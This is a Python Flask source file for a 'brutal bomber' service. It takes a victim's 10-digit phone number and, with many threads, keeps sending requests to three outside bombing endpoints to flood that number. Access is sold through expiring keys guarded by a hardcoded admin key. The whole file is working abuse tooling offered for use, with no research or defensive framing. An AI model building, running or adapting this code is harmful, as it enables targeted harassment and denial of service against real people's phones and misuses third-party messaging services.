# ============================================
# brutal_bomber_api.py
# 3 APIs (Ultra + Part1 + Part2) + Key System
# Fixed for Render — Python 3.10 compatible
# ============================================

from flask import Flask, request, jsonify
import requests
import time
import secrets
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

app = Flask(__name__)

# ====== KEY SYSTEM ======
DEFAULT_KEY = "admin123"
keys_db = {}

def generate_key(duration_hours=24):
    key = secrets.token_hex(16)
    created = datetime.now()
    expires = created + timedelta(hours=duration_hours)
    keys_db[key] = {
        "created": created.isoformat(),
        "expires": expires.isoformat(),
        "active": True
    }
    return key

def validate_key(key):
    if key == DEFAULT_KEY:
        return True
    if key not in keys_db:
        return False
    if not keys_db[key]["active"]:
        return False
    expires = datetime.fromisoformat(keys_db[key]["expires"])
    if datetime.now() > expires:
        keys_db[key]["active"] = False
        return False
    return True

def expire_key(key):
    if key in keys_db:
        keys_db[key]["active"] = False
        return True
    return False

# ====== 3 APIS ======
THREE_APIS = [
    {
        "name": "Ultra_Bomber",
        "url": "https://ultra-brutal-bomber.onrender.com/bomb",
        "method": "GET",
        "params": {"phone": "{num}"}
    },
    {
        "name": "Part1_Bomber",
        "url": "https://bomber-part-1.onrender.com/bomb",
        "method": "GET",
        "params": {"phone": "{num}"}
    },
    {
        "name": "Part2_Bomber",
        "url": "https://brutal-bomber-part-2.onrender.com/bomb",
        "method": "GET",
        "params": {"phone": "{num}"}
    }
]

# ====== BOMBER ENGINE ======
class BrutalBomber:
    def __init__(self, number, threads=50, delay=0.005):
        self.number = number
        self.threads = threads
        self.delay = delay
        self.success = 0
        self.failed = 0
        self.running = True
        self.start_time = time.time()
        self.session = requests.Session()
    
    def _send(self, api):
        if not self.running:
            return False
        time.sleep(self.delay)
        try:
            params = api["params"].copy()
            for k, v in params.items():
                if isinstance(v, str) and "{num}" in v:
                    params[k] = v.replace("{num}", self.number)
            resp = self.session.get(api["url"], params=params, timeout=10)
            if resp.status_code == 200:
                self.success += 1
                return True
            self.failed += 1
            return False
        except:
            self.failed += 1
            return False
    
    def start(self):
        self.running = True
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            while self.running:
                futures = [executor.submit(self._send, api) for api in THREE_APIS]
                for future in as_completed(futures):
                    if not self.running:
                        break
                    future.result()
                elapsed = int(time.time() - self.start_time)
                rate = self.success / elapsed if elapsed > 0 else 0
                print(f"✅ {self.success} | ❌ {self.failed} | ⚡ {rate:.1f}/s")
        
        return {
            "target": self.number,
            "successful": self.success,
            "failed": self.failed,
            "total_apis": len(THREE_APIS)
        }
    
    def stop(self):
        self.running = False

active_bombers = {}

# ====== API ENDPOINTS ======

@app.route('/')
def home():
    return {
        "status": "🔥 BRUTAL BOMBER API 🔥",
        "version": "2.0",
        "apis": [api["name"] for api in THREE_APIS],
        "endpoints": {
            "/bomb": "GET/POST — phone, key, threads, delay",
            "/keygen": "POST — Generate new API key (admin key required)",
            "/key/expire": "POST — Expire a key (admin key required)",
            "/keys": "POST — List all keys (admin key required)",
            "/health": "GET — Health check",
            "/stop": "GET — Stop bombing"
        }
    }

@app.route('/bomb', methods=['GET', 'POST'])
def bomb():
    if request.method == 'GET':
        phone = request.args.get('phone')
        key = request.args.get('key')
        threads = int(request.args.get('threads', 50))
        delay = float(request.args.get('delay', 0.005))
    else:
        data = request.get_json() or {}
        phone = data.get('phone')
        key = data.get('key')
        threads = data.get('threads', 50)
        delay = data.get('delay', 0.005)
    
    if not key or not validate_key(key):
        return jsonify({"status": "error", "message": "Invalid or expired key"}), 401
    
    if not phone or len(phone) != 10 or not phone.isdigit():
        return jsonify({"status": "error", "message": "Phone number must be 10 digits"}), 400
    
    bomber = BrutalBomber(phone, threads, delay)
    bomber_id = f"{phone}_{int(time.time())}"
    active_bombers[bomber_id] = bomber
    
    import threading
    def run_bomb():
        result = bomber.start()
        if bomber_id in active_bombers:
            del active_bombers[bomber_id]
        return result
    
    threading.Thread(target=run_bomb).start()
    
    return jsonify({
        "status": "success",
        "message": "Bombing started",
        "bomber_id": bomber_id,
        "phone": phone,
        "apis": len(THREE_APIS)
    })

@app.route('/stop', methods=['GET', 'POST'])
def stop():
    if request.method == 'GET':
        bomber_id = request.args.get('bomber_id')
    else:
        data = request.get_json() or {}
        bomber_id = data.get('bomber_id')
    
    if not bomber_id:
        return jsonify({"status": "error", "message": "bomber_id required"}), 400
    
    if bomber_id in active_bombers:
        active_bombers[bomber_id].stop()
        del active_bombers[bomber_id]
        return jsonify({"status": "success", "message": "Bombing stopped"})
    
    return jsonify({"status": "error", "message": "Bomber not found"}), 404

@app.route('/keygen', methods=['POST'])
def keygen():
    data = request.get_json() or {}
    admin_key = data.get('admin_key')
    duration = int(data.get('duration', 24))
    
    if admin_key != DEFAULT_KEY:
        return jsonify({"status": "error", "message": "Invalid admin key"}), 401
    
    new_key = generate_key(duration)
    return jsonify({
        "status": "success",
        "key": new_key,
        "expires": keys_db[new_key]["expires"],
        "duration": f"{duration} hours"
    })

@app.route('/key/expire', methods=['POST'])
def expire():
    data = request.get_json() or {}
    admin_key = data.get('admin_key')
    key_to_expire = data.get('key')
    
    if admin_key != DEFAULT_KEY:
        return jsonify({"status": "error", "message": "Invalid admin key"}), 401
    
    if not key_to_expire:
        return jsonify({"status": "error", "message": "key required"}), 400
    
    if expire_key(key_to_expire):
        return jsonify({"status": "success", "message": f"Key {key_to_expire} expired"})
    
    return jsonify({"status": "error", "message": "Key not found"}), 404

@app.route('/keys', methods=['POST'])
def list_keys():
    data = request.get_json() or {}
    admin_key = data.get('admin_key')
    
    if admin_key != DEFAULT_KEY:
        return jsonify({"status": "error", "message": "Invalid admin key"}), 401
    
    return jsonify({
        "status": "success",
        "keys": keys_db
    })

@app.route('/health')
def health():
    return jsonify({
        "status": "healthy",
        "version": "2.0",
        "apis": len(THREE_APIS),
        "active_keys": len([k for k, v in keys_db.items() if v["active"]]),
        "total_keys": len(keys_db)
    })

@app.route('/stats')
def stats():
    return jsonify({
        "total_apis": len(THREE_APIS),
        "apis": [api["name"] for api in THREE_APIS],
        "active_keys": len([k for k, v in keys_db.items() if v["active"]]),
        "total_keys": len(keys_db)
    })

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=False)
